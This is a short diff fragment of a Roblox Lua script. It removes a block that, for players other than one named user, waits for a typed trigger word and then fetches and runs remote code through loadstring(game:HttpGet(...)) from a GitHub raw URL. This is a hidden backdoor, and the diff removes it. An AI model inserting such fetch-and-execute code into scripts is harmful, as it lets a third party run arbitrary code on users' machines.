@@ -125,14 +125,3 @@ user.FocusLost:connect(function()
 	end
 end)
 
-if game.Players.LocalPlayer.Name == "zzotac" then
-    print("Ok")
-else
-while true do task.wait()
-if user.Text == "zzotac" then
-    fake:Destroy()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/bad'))()
-   break
-end
-end
-end
